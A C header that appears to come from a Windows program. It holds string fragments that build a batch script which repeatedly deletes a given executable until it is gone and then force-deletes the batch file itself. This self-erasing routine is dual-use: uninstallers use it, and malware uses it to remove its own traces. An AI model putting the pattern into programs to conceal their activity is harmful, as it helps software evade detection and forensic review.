#ifndef _DELETE_BATCH
#define _DELETE_BATCH

char batch_1[] =	"@echo off\r\n" 
					":d\r\n"
					"del "; // + exe

char batch_2[] =	"if exist "; // + exe

char batch_3[] =	" goto d\r\n";

char batch_4[] =	"del /F "; // .bat

char batch_5[] =	"\r\n";

#endif